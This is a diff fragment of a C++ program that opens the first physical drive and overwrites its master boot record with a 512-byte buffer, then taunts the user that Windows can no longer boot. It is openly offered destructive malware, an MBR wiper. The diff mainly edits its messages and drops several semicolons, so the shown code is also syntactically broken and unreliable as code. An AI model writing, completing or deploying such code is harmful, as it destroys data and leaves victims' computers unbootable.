@@ -18,15 +18,15 @@ int main(){
 
     HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,NULL,NULL)
     if(WriteFile(MasterBootRecord, mbrData, 512, &write, NULL) == TRUE){
-        cout << "Master Boot Record Is Over Written! So You Cannot Boot Your Windows Tell Good Bye To Your Windows" << endl; // if the process done successfull means it will pop up the printf
-        sleep(5000);
+        cout << "Master Boot Record Over Writed Tell Good Bye To Your Windows"
+        sleep(5000)
         ExitProcess(0);
-    }//or else it will do this
-    else{
-        cout << "Ahh You Escaped From My HarmFull Effect";
-        sleep(5000);
+    }else{
+        cout << "Ahh You Escaped From My HarmFull Effect.."
+        sleep(5000)
         ExitProcess(0);
     }
+    
     CloseHandle(MasterBootRecord) //close handler
 
     return EXIT_SUCCESS //return
